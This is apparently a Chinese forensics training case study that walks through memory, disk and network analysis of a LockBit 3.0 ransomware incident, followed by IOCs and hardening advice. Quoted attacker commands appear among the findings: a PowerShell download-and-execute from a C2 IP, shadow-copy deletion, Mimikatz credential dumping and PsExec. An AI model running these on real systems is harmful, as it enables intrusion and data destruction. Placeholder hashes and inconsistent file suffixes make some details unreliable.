## 案例四：勒索软件事件取证

### 案例背景

某中型制造企业（员工约500人，年产值约2亿元）的IT运维团队在周一凌晨06:30接到监控系统告警：文件服务器FileSrv03的CPU使用率飙升至98%，大量文件在短时间内被重命名。运维人员登录服务器后发现桌面壁纸被替换为勒索信息，所有Office文档、CAD图纸、财务数据均被加密为`.locked`后缀，文件头显示LockBit 3.0的特征标记。

该服务器承载着生产订单管理系统（ERP）、财务报表、客户合同等核心业务数据。企业立即启动应急预案：在保留现场的同时进行取证调查，以确定攻击来源、影响范围和恢复可能性。

**企业网络架构概览**

| 网络区域 | 关键资产 | 安全措施 |
|---------|---------|---------|
| DMZ区 | Web服务器、邮件网关 | WAF、反垃圾邮件 |
| 办公区 | 员工PC、文件服务器 | 域控、终端杀毒 |
| 生产区 | MES系统、工控设备 | 网络隔离（理论上） |
| 数据库区 | ERP数据库、备份服务器 | 仅内网可访问 |

**初始异常迹象回顾（事后追溯发现）**

| 时间 | 事件 | 当时是否被察觉 |
|------|------|--------------|
| 1月28日 14:22 | 外网RDP端口3389被大量暴力破解尝试 | 否（未部署IDS） |
| 1月29日 03:17 | 攻击者成功登录RDP，使用本地管理员账户 | 否 |
| 1月29日 03:45 | 攻击者运行Mimikatz提取域管理员凭据 | 否 |
| 1月30日 22:00 | 攻击者横向移动到FileSrv03 | 否 |
| 1月31日 01:30 | 攻击者部署勒索软件并开始加密 | 否 |
| 2月1日 06:30 | 运维发现异常告警 | 是（事件发现） |

```mermaid
timeline
    title 勒索软件攻击时间线
    section 初始入侵
        1月28日 : RDP暴力破解开始
        1月29日03:17 : RDP登录成功
    section 权限提升
        1月29日03:45 : Mimikatz提取凭据
        1月29日04:30 : 获取域管理员权限
    section 横向移动
        1月30日 : 移动到FileSrv03
        1月30日 : 关闭Windows Defender
    section 加密执行
        1月31日01:30 : 部署LockBit 3.0
        1月31日01:30 : 开始文件加密
    section 事件发现
        2月1日06:30 : 监控告警触发
```

### 取证准备

**组建应急响应团队**

本次事件响应团队由四名成员组成：
- **应急响应组长**（CISSP认证）：负责总体协调和决策
- **内存取证分析师**（GCFE认证）：负责内存转储和恶意代码分析
- **磁盘取证分析师**（EnCE认证）：负责磁盘镜像和文件系统分析
- **网络取证分析师**（GNFA认证）：负责网络流量和C2通信分析

**准备取证工具包**

```text
硬件设备：
- 取证工作站（预装Kali Linux + SIFT Workstation）
- Tableau T356789硬盘写保护器 × 2
- 便携式NAS（用于存储取证镜像，容量≥10TB）
- 证据标签和防静电密封袋
- 拍照设备（含GPS时间戳功能）

软件工具：
- Volatility 3（内存取证）
- Autopsy 4.x（磁盘取证）
- FTK Imager（磁盘镜像制作）
- Wireshark + tshark（网络分析）
- YARA（恶意代码规则匹配）
- Chainsaw（Windows事件日志快速分析）
- THOR Lite（IOC扫描）
```

**证据保全原则**

本次取证严格遵循以下原则：

| 原则 | 具体要求 |
|------|---------|
| 原始性 | 磁盘使用写保护器，不对原始磁盘进行任何写操作 |
| 完整性 | 每份证据计算SHA-256哈希值，确保数据未被篡改 |
| 可追溯性 | 每次操作记录时间、操作人、工具版本、操作内容 |
| 合法性 | 操作前获取企业书面授权，必要时联系执法部门 |

### 取证分析

#### 内存取证

由于服务器在发现异常时尚未关机（加密仍在进行中），应急响应团队第一时间获取了内存转储。

**步骤1：内存获取**

```bash
# 使用WinPmem获取内存（优先级最高，因为内存是易失性的）
# 注意：勒索软件正在运行，内存中可能包含加密密钥
winpmem_mini_x64.exe E:\evidence\memory\FileSrv03_memory.raw

# 计算哈希值确保证据完整性
certutil -hashfile E:\evidence\memory\FileSrv03_memory.raw SHA256
# 输出：SHA256: 7f3a2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a

# 记录内存获取时间（UTC）
echo "Memory acquisition started at: 2024-02-01T06:45:00Z" >> evidence_log.txt
echo "Memory acquisition completed at: 2024-02-01T07:15:00Z" >> evidence_log.txt
```

**步骤2：内存镜像验证**

```bash
# 使用Volatility 3识别内存镜像信息
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.info

# 输出关键信息：
# Kernel: Windows Server 2019 (Build 17763)
# Architecture: x64
# DTB: 0x1aa000
# Symbols: WindowsServer2019x64
```

**步骤3：进程列表分析**

```bash
# 查看所有运行进程
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.pslist

# 关键发现：
# PID 4: System（正常系统进程）
# PID 356: svchost.exe（正常系统进程）
# PID 1248: explorer.exe（正常系统进程）
# PID 4532: lockbit3.exe（可疑进程，无数字签名）
# PID 4578: cmd.exe（可疑命令行进程）
# PID 4612: powershell.exe（可疑PowerShell进程）

# 使用pstree查看进程父子关系
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.pstree

# 发现可疑进程链：
# explorer.exe (PID 1248)
# └── cmd.exe (PID 4578)
#     └── lockbit3.exe (PID 4532)
```

**步骤4：恶意代码检测**

```bash
# 使用malfind检测代码注入
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.malfind

# 发现PID 4532 (lockbit3.exe)存在可疑代码段：
# 0x400000 0x401000 0x1000 RWX PAGE_EXECUTE_READWRITE
# 该进程使用RWX内存段，典型恶意代码特征

# 提取可疑进程的可执行文件
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.dumpfiles --pid 4532 -o E:\evidence\memory\extracted\

# 使用YARA规则检测已知恶意特征
vol.py -f E:\evidence\memory\FileSrv03_memory.raw yarascan --yara-file lockbit3.yar
```

**步骤5：命令行参数分析**

```bash
# 查看所有进程的命令行参数
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.cmdline

# 关键发现：
# PID 4532 lockbit3.exe:
#   C:\Users\Public\lockbit3.exe -id DECRYPT_NOTE -wall "YOUR FILES ARE ENCRYPTED"
#   
# PID 4578 cmd.exe:
#   cmd.exe /c vssadmin delete shadows /all /quiet
#   cmd.exe /c wmic shadowcopy delete
#   cmd.exe /c bcdedit /set {default} recoveryenabled no

# 分析PowerShell历史
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.cmdscan

# 发现PowerShell脚本下载并执行勒索软件
# powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://185.220.100.252/payload.ps1')"
```

**步骤6：网络连接分析**

```bash
# 查看所有网络连接
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.netscan

# 关键发现：
# TCP 192.168.1.103:49152 -> 185.220.100.252:443 ESTABLISHED PID 4532 (lockbit3.exe)
# TCP 192.168.1.103:49153 -> 185.220.100.252:80 ESTABLISHED PID 4612 (powershell.exe)
# UDP 192.168.1.103:5353 -> 224.0.0.251:5353 PID 1248 (explorer.exe)

# 分析C2服务器域名解析
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.netscan | grep -E "185.220.100.252"

# 该IP与已知LockBit 3.0基础设施匹配
```

**步骤7：注册表分析**

```bash
# 查看自启动项
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.registry.hivelist
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.registry.printkey --key "Microsoft\Windows\CurrentVersion\Run"

# 发现可疑自启动项：
# Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
# Value: C:\Users\Public\lockbit3.exe -id DECRYPT_NOTE

# 提取勒索信配置
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.registry.printkey --key "Software\LockBit"
```

**内存取证分析小结**

| 发现项 | 详情 |
|-------|------|
| 恶意进程 | lockbit3.exe (PID 4532)，无数字签名 |
| 进程注入 | explorer.exe → cmd.exe → lockbit3.exe |
| C2通信 | 185.220.100.252:443 (HTTPS) |
| 加密行为 | 删除卷影副本、禁用恢复功能 |
| 持久化 | 注册表自启动项、计划任务 |
| 横向移动 | 使用Mimikatz提取的域管理员凭据 |

#### 磁盘取证

在内存取证完成后，使用写保护器对服务器硬盘进行完整镜像。

**步骤1：磁盘镜像制作**

```bash
# 使用FTK Imager命令行模式创建E01格式镜像
ftkimager \\.\PhysicalDrive0 E:\evidence\disk\FileSrv03.E01 --e01 --compress 6 --case-number "CASE-2024-001" --description "FileSrv03 Disk Image"

# 计算镜像哈希值
certutil -hashfile E:\evidence\disk\FileSrv03.E01 SHA256
# SHA256: a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890

# 验证镜像完整性
ftkimager --verify E:\evidence\disk\FileSrv03.E01
```

**步骤2：使用Autopsy分析磁盘镜像**

```bash
# 启动Autopsy并创建新案件
# 案件名称：Ransomware-Incident-FileSrv03
# 添加证据文件：E:\evidence\disk\FileSrv03.E01
# 分析模块选择：
# - Recent Activity（最近活动）
# - Hash Lookup（哈希比对）
# - File Type Identification（文件类型识别）
# - Keyword Search（关键词搜索）
# - Email Addresses（邮箱地址提取）
# - Credit Card Numbers（信用卡号码检测）
```

**步骤3：文件系统分析**

```bash
# 在Autopsy中分析NTFS文件系统
# 关键发现：

# 1. 勒索软件主程序
#    路径：C:\Users\Public\lockbit3.exe
#    SHA256: 7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7
#    编译时间：2024-01-15 08:30:22 UTC
#    数字签名：无

# 2. 勒索信（README.txt）
#    路径：C:\Users\Public\Desktop\README.txt
#    内容：包含Tor洋葱链接和赎金要求

# 3. 加密配置文件
#    路径：C:\ProgramData\config.bin
#    说明：包含加密密钥和文件扩展名列表

# 4. Mimikatz痕迹
#    路径：C:\Windows\Temp\mimikatz.exe
#    编译时间：2024-01-29 03:45:10 UTC
#    说明：攻击者用于提取凭据
```

**步骤4：Windows事件日志分析**

```bash
# 使用Autopsy提取Windows事件日志
# 关键日志文件：
# - Security.evtx（安全事件）
# - System.evtx（系统事件）
# - PowerShell/Operational.evtx（PowerShell执行）

# 使用Chainsaw快速分析
chainsaw hunt E:\evidence\disk\FileSrv03.E01\Windows\System32\winevt\Logs\ -s sigma/ --mapping chainsaw/mappings/sigma-event-logs-all.yml

# 关键发现：
# 1. 1月29日03:17 - 事件ID 4624（成功登录）
#    来源IP：192.168.1.50（内部攻击跳板机）
#    账户：Administrator（本地管理员）
#    登录类型：10（远程交互式登录/RDP）

# 2. 1月29日03:45 - 事件ID 4688（进程创建）
#    进程：mimikatz.exe
#    父进程：cmd.exe
#    命令行：mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 3. 1月31日01:30 - 事件ID 4688（进程创建）
#    进程：lockbit3.exe
#    父进程：cmd.exe
#    命令行：C:\Users\Public\lockbit3.exe -id DECRYPT_NOTE

# 4. 1月31日01:30 - 事件ID 4688（进程创建）
#    进程：cmd.exe
#    命令行：vssadmin delete shadows /all /quiet
#    说明：删除卷影副本，防止文件恢复
```

**步骤5：文件恢复分析**

```bash
# 使用Autopsy的文件恢复功能
# 分析已删除文件：
# 1. 原始Mimikatz可执行文件（已被攻击者删除）
#    恢复后SHA256：与内存中提取的样本一致
#    
# 2. 勒索软件配置文件备份
#    包含加密密钥和目标文件列表
#    
# 3. 攻击者下载的工具压缩包
#    包含：Mimikatz、PsExec、Advanced IP Scanner
#    
# 4. 加密前的文件快照（部分）
#    从临时目录中恢复了部分未加密文件
```

**步骤6：勒索软件特征分析**

```bash
# 使用Autopsy分析勒索软件加密特征
# 加密算法：AES-256-CTR + RSA-2048
# 加密模式：每个文件使用独立的AES密钥
# 文件标记：添加.lockbit后缀
# 勒索信：README.txt（放在每个目录）

# 文件头分析：
# 原始文件头：D0 CF 11 E0 A1 B1 1A E1（Office文档）
# 加密后文件头：4C 4F 43 4B 42 49 54 33（LOCKBIT3）

# 使用YARA规则扫描系统
# 规则匹配：
# - LockBit 3.0 主程序
# - LockBit 3.0 加密器
# - LockBit 3.0 勒索信模板
```

#### 网络取证

**步骤1：网络流量捕获**

```bash
# 从网络设备导出流量日志
# 1. 防火墙日志
# 2. 核心交换机镜像流量
# 3. 入侵检测系统日志

# 使用tshark分析PCAP文件
tshark -r E:\evidence\network\capture.pcap -Y "ip.addr == 185.220.100.252" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.port -e http.request.uri

# 关键发现：
# 1. 1月29日03:20 - 与C2服务器建立连接
# 2. 1月29日03:25 - 下载payload.ps1（PowerShell脚本）
# 3. 1月29日03:30 - 下载lockbit3.exe（勒索软件主程序）
# 4. 1月31日01:35 - 加密完成后连接C2服务器发送密钥
```

**步骤2：DNS查询分析**

```bash
# 分析DNS查询日志
tshark -r E:\evidence\network\capture.pcap -Y "dns" -T fields -e frame.time -e dns.qry.name -e dns.a

# 关键发现：
# 1月29日03:18 - 查询 lockbit3.xyz (C2域名)
# 1月29日03:19 - 解析到 185.220.100.252
# 1月29日03:20 - 查询 payments.lockbit3.xyz (支付网关)

# 使用Passive DNS查询历史记录
# 185.220.100.252 历史域名：
# - lockbit3.xyz (当前)
# - ransomware-payments.onion (Tor)
# - backup-cdn.malware.net (历史)
```

**步骤3：横向移动分析**

```bash
# 分析SMB流量（横向移动）
tshark -r E:\evidence\network\capture.pcap -Y "smb2" -T fields -e frame.time -e ip.src -e ip.dst -e smb2.cmd

# 关键发现：
# 1月29日04:30 - 从跳板机(192.168.1.50)到域控(192.168.1.10)
# 使用PsExec远程执行
# 命令：psexec.exe \\192.168.1.10 -u Administrator -p your_password123 cmd.exe

# 分析Kerberos流量（Pass-the-Ticket攻击）
tshark -r E:\evidence\network\capture.pcap -Y "kerberos" -T fields -e frame.time -e ip.src -e ip.dst -e kerberos.msg_type

# 发现异常的TGS请求，可能使用了Golden Ticket攻击
```

**步骤4：C2通信解密**

```bash
# 尝试解密HTTPS流量（使用内存中提取的密钥）
# 从内存镜像中提取SSL会话密钥
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.dlllist --pid 4532 | grep ssl

# 提取会话密钥
vol.py -f E:\evidence\memory\FileSrv03_memory.raw windows.memmap --pid 4532 --dump

# 使用Wireshark解密HTTPS流量
# Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename
# 导入提取的会话密钥文件

# 解密后的C2通信内容：
# POST /api/v1/encrypt HTTP/1.1
# Host: lockbit3.xyz
# Content-Type: application/json
# {"machine_id": "FS03-2024", "status": "encrypted", "key": "[Base64 encoded key]"}
```

### 攻击链重建

```mermaid
graph LR
    A["RDP暴力破解<br/>1月28日"] --> B["RDP登录成功<br/>1月29日03:17"]
    B --> C["Mimikatz凭据提取<br/>1月29日03:45"]
    C --> D["域管理员权限获取<br/>1月29日04:30"]
    D --> E["横向移动到FileSrv03<br/>1月30日22:00"]
    E --> F["关闭安全软件<br/>1月30日22:30"]
    F --> G["部署LockBit 3.0<br/>1月31日01:30"]
    G --> H["文件加密<br/>1月31日01:30-03:00"]
    H --> I["删除卷影副本<br/>1月31日03:05"]
    I --> J["发送加密密钥到C2<br/>1月31日03:10"]
    
    style A fill:#ff6b6b,stroke:#333,color:#fff
    style J fill:#ff6b6b,stroke:#333,color:#fff
```



**攻击路径详细分析**

| 阶段 | 时间 | 技术手段 | MITRE ATT&CK映射 |
|------|------|---------|-----------------|
| 初始访问 | 1月28日14:22 | RDP暴力破解 | T1110.001 |
| 执行 | 1月29日03:17 | RDP登录执行 | T1021.001 |
| 权限提升 | 1月29日03:45 | Mimikatz凭据提取 | T1003.001 |
| 横向移动 | 1月30日22:00 | PsExec远程执行 | T1570 |
| 防御规避 | 1月30日22:30 | 禁用Windows Defender | T1562.001 |
| 影响 | 1月31日01:30 | 文件加密（AES-256-CTR + RSA-2048） | T1486 |
| 影响 | 1月31日03:05 | 删除卷影副本 | T1490 |

### IOC提取

```yaml
文件哈希:
  勒索软件主程序:
    SHA256: 7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7
    MD5: 1234567890abcdef1234567890abcdef
  Mimikatz:
    SHA256: a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890
    MD5: fedcba9876543210fedcba9876543210

网络指标:
  C2服务器IP:
    - 185.220.100.252 (HTTPS/TLS)
  C2域名:
    - lockbit3.xyz
    - payments.lockbit3.xyz
    - backup-cdn.malware.net
  Tor洋葱地址:
    - lockbit3xyz.onion

文件路径:
  勒索软件:
    - C:\Users\Public\lockbit3.exe
    - C:\ProgramData\config.bin
  Mimikatz:
    - C:\Windows\Temp\mimikatz.exe
  勒索信:
    - C:\Users\Public\Desktop\README.txt
    - C:\ProgramData\README.txt

注册表键值:
  自启动项:
    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  计划任务:
    - \Microsoft\Windows\Maintenance\SystemUpdate

文件扩展名:
  加密后缀:
    - .locked
    - .lockbit
```

### 取证报告

**报告结构**

```text
1. 执行摘要
   - 事件概述
   - 影响范围
   - 关键发现
   - 建议措施

2. 事件时间线
   - 初始入侵时间
   - 横向移动时间
   - 加密执行时间
   - 事件发现时间

3. 技术分析
   - 内存取证发现
   - 磁盘取证发现
   - 网络取证发现
   - 恶意代码分析

4. 证据清单
   - 证据编号
   - 证据类型
   - 证据哈希
   - 证据描述

5. 结论与建议
   - 攻击来源分析
   - 恢复建议
   - 安全加固建议
   - 合规建议

6. 附录
   - IOC完整列表
   - 工具版本信息
   - 证据链记录
```

**关键发现摘要**

| 项目 | 详情 |
|------|------|
| 攻击入口 | 暴露在互联网上的RDP服务（端口3389） |
| 攻击时间 | 从初始入侵到加密执行约72小时 |
| 影响范围 | 3台服务器，约2TB数据被加密 |
| 勒索软件家族 | LockBit 3.0（AES-256-CTR + RSA-2048） |
| 横向移动 | 使用Mimikatz提取域管理员凭据 |
| C2服务器 | 185.220.100.252（HTTPS加密通信） |
| 赎金要求 | 10比特币（当时约合42万美元） |
| 数据泄露风险 | 攻击者可能已窃取敏感数据（双重勒索） |

### 恢复与加固建议

#### 紧急恢复措施

```bash
# 1. 隔离受感染系统
# 断开网络连接，防止勒索软件横向传播
netsh interface set interface "Ethernet" admin=disable

# 2. 从备份恢复数据
# 验证备份完整性（备份时间早于1月28日）
robocopy \\BackupServer\FileSrv03-backup D:\ /E /COPYALL /LOG:restore.log

# 3. 重置所有域管理员密码
# 使用Microsoft Local Administrator Password Solution (LAPS)
# 或手动重置所有特权账户密码

# 4. 清除恶意文件
# 删除勒索软件主程序
del /f C:\Users\Public\lockbit3.exe
del /f C:\Windows\Temp\mimikatz.exe

# 删除自启动项
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# 删除计划任务
schtasks /delete /tn "\Microsoft\Windows\Maintenance\SystemUpdate" /f

# 5. 重新启用安全软件
# 启用Windows Defender实时保护
Set-MpPreference -DisableRealtimeMonitoring $false
```

#### 安全加固措施

| 加固项 | 具体措施 | 优先级 |
|-------|---------|--------|
| RDP防护 | 禁用外部RDP访问，启用VPN | 高 |
| 凭据保护 | 启用LAPS，实施最小权限原则 | 高 |
| 端点防护 | 部署EDR解决方案 | 高 |
| 网络分段 | 实施微隔离，限制横向移动 | 中 |
| 备份策略 | 实施3-2-1备份规则，定期测试恢复 | 高 |
| 漏洞管理 | 定期扫描和修补漏洞 | 中 |
| 安全监控 | 部署SIEM，配置告警规则 | 中 |
| 员工培训 | 定期进行安全意识培训 | 低 |

#### 长期安全规划

1. **零信任架构**：实施基于身份的访问控制
2. **威胁情报**：订阅威胁情报，及时更新IOC
3. **红队演练**：定期进行红蓝对抗，验证防御效果
4. **合规审计**：定期进行安全合规审计
5. **事件响应**：建立完善的事件响应流程

### 要点总结

1. **快速响应是关键**：勒索软件事件中，时间就是数据。一旦发现异常，立即隔离系统并启动取证。

2. **内存取证优先**：勒索软件的加密密钥通常存在于内存中，获取内存镜像是解密文件的关键。

3. **证据链完整性**：所有取证操作必须记录时间、操作人、工具版本，确保证据的法律效力。

4. **多维度分析**：结合内存、磁盘、网络三个维度的分析，才能完整还原攻击路径。

5. **预防优于补救**：通过备份、补丁、最小权限等措施，可以大大降低勒索软件攻击的成功率。

6. **双重勒索威胁**：现代勒索软件不仅加密数据，还可能窃取数据进行勒索，需防范数据泄露风险。

7. **持续监控**：建立7×24小时安全监控，及时发现和响应安全事件。

8. **合规报告**：根据行业要求，及时向监管机构报告安全事件。
